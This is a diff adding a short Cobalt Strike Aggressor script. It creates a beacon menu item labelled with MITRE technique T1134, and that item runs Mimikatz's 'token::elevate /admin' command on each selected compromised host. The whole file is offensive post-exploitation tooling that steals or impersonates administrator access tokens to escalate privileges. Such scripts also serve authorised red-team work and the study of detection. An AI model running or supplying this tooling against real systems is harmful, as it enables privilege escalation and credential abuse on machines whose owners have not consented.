@@ -1,0 +1,14 @@
+#Mimikatz Elevate to Admin Token
+item "Mimikatz - Elevate to Admin Token  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			elevateadmin($bid);
+		}
+	}
+
+
+
+#Elevate to Admin Token
+sub elevateadmin{
+bmimikatz($1, "token::elevate /admin");
+}
